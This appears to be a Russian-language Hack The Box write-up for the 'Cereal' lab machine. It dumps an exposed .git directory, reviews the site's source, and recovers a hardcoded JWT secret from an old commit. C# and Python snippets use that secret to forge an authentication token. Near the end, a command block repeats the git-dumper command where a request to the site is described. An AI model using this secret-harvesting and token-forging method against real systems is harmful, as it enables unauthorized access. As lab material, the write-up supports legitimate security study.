# Source Code

## Git Dumper

Из нашего [[Writeups/Hack the Box/Boxes/Cereal/5 - Enumeration#source cereal htb|gobuster scan]] мы знаем, что на домене `source.cereal.htb` есть папка `.git`. Поэтому мы можем попробовать скачать исходный код сайта с помощью инструмента `gitdumper`:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ /opt/git-dumper/git-dumper.py http://source.cereal.htb/.git site/
```

Это скачивает весь код, и мы можем открыть его в VSCode.

Выполнение `git log` показывает интересный коммит:

![[Pasted image 20210605185207.png]]

Мы можем просмотреть детали с помощью `git show`:

![[Pasted image 20210605185310.png]]

В `.gitignore` также есть некоторые интересные файлы — например, `cereal.db`, который, вероятно, является названием файла базы данных, используемой в проекте. Он отсутствует в скачанном репозитории.

## Controllers + Routes

Я не был знаком с .NET при входе в этот проект, но я немного знал C# и много — Laravel. Первое, что я искал, чтобы понять приложение, — это Controllers & Routes.

Файл `site/Controllers/RequestsController.cs` содержит методы контроллера — 

![[Pasted image 20210605191522.png]]

Я не нашел соответствующую «route», указывающую на эти методы, как в Laravel, поэтому предположил, что это полная определённость маршрута. Однако я нашёл компонент `site/ClientApp/src/_components/PrivateRoute.jsx`, который, похоже, проверяет аутентификацию:

![[Pasted image 20210605191834.png]]

Я искал экземпляры компонента приватного маршрута и нашёл ещё несколько маршрутов в файле `site/ClientApp/src/App/App.jsx`:

![[Pasted image 20210605191917.png]]

Это показывает, что есть аутентифицированная страница `/admin`. Она определена в `site/ClientApp/src/AdminPage/AdminPage.jsx` и, похоже, отображает запросы Cereal из базы данных:

![[Pasted image 20210605192048.png]]

Файл `site/ClientApp/src/HomePage/HomePage.jsx` похоже на форму отправки, и говорит, какие поля нужно ввести при отправке cereal:

![[Pasted image 20210605212024.png]]

Файл `site/ClientApp/src/_services/request.service.js` также немного рассказывает о методах запроса:

![[Pasted image 20210605212547.png]]

## Authentication

Аутентификация, по-видимому, обрабатывается в основном файлом `site/Services/UserService.cs`, который генерирует JWT-токены:

![[Pasted image 20210605192151.png]]

Пользователи, похоже, сохраняются локально с помощью JavaScript, как показано в файле `site/ClientApp/src/_services/authentication.service.js`:

![[Pasted image 20210605212657.png]]

Мы можем использовать токен из старых коммитов репозитория, чтобы создать JWT-токен.

### Использование .NET

Я попытался создать JWT с помощью кода C#, посмотрев на следующие ссылки в качестве референсы:
- https://docs.microsoft.com/en-us/dotnet/csharp/programming-guide/main-and-command-args/
- https://stackoverflow.com/questions/20392243/run-c-sharp-code-on-linux-terminal
- https://stackoverflow.com/questions/18677837/decoding-and-verifying-jwt-token-using-system-identitymodel-tokens-jwt

Это код, который я использовал, взятый из главного проекта и без удаления ссылок на не нужные библиотеки:

```csharp
using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;

namespace TokenGeneration {
    class GenerateToken {
        static void Main(string[] args)
        {
            var tokenHandler = new JwtSecurityTokenHandler();
            var key = Encoding.ASCII.GetBytes("secretlhfIH&FY*#oysuflkhskjfhefesf");

            //создать токен-описатель для пользователя 1
            var tokenDescriptor = new SecurityTokenDescriptor
            {
                Subject = new ClaimsIdentity(new Claim[]
                {
                    new Claim(ClaimTypes.Name, "1")
                }),
                Expires = DateTime.UtcNow.AddDays(7),
                SigningCredentials = new SigningCredentials(new SymmetricSecurityKey(key), SecurityAlgorithms.HmacSha256Signature)
            };

            var token = tokenHandler.CreateToken(tokenDescriptor);
            Console.WriteLine(tokenHandler.WriteToken(token));
        }
    }
}
```

Я попытался скомпилировать его с помощью `mcs`, но там отсутствовала зависимость:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ mcs -out:gentoken.exe gentoken.cs 
gentoken.cs(3,14): error CS0234: The type or namespace name `IdentityModel' does not exist in the namespace `System'. Are you missing an assembly reference?
Compilation failed: 1 error(s), 0 warnings
```

Я знал, что могу легко решить это на Windows с помощью Visual Studio, но не установил его на Linux. Я рассмотрел [установку .NET](https://docs.microsoft.com/en-us/dotnet/core/install/linux-ubuntu), но не считал ценным тратить время на настройку, если есть более простой способ. Я также не хотел создавать Windows VM, поэтому посмотрел, можно ли использовать Python вместо этого.

### Использование Python

Я использовал библиотеку `jwt` для этого: [https://pyjwt.readthedocs.io/en/latest/](https://pyjwt.readthedocs.io/en/latest/)

После некоторых экспериментов с JWT-токенами я пришёл к следующему коду, чтобы выдать корректный токен:

```python
import jwt
from datetime import datetime, timedelta

#взять ключ из старого git-кода — коммит ID 8f2a1a88f15b9109e1f63e4e4551727bfb38eee5
key = "secretlhfIH&FY*#oysuflkhskjfhefesf"

#запаковать с помощью HMAC-SHA-256
encoded = jwt.encode({"exp": datetime.utcnow() + timedelta(days=7), "name": 1}, key, algorithm="HS256")

print(encoded)
```

Теперь этот токен можно использовать при отправке запросов, например, на `/requests`. Это код, который я использовал для создания корректного токена — одной из ключевых проблем была отсутствие истечения срока для JWT, что показалось интересным: `WWW-Authenticate: Bearer error="invalid_token", error_description="The token has no expiration"`

## IP Whitelist

Несколько функций имеют декоратор:

```csharp
[Authorize(Policy = "RestrictIP")]
```

Это означает, что эти функции доступны только через localhost, то есть самому серверу. Мы можем увидеть это, если отправим запрос на cereal:

```bash
┌──(mac㉿kali)-[~/Documents/HTB/cereal]
└─$ /opt/git-dumper/git-dumper.py http://source.cereal.htb/.git site/
```
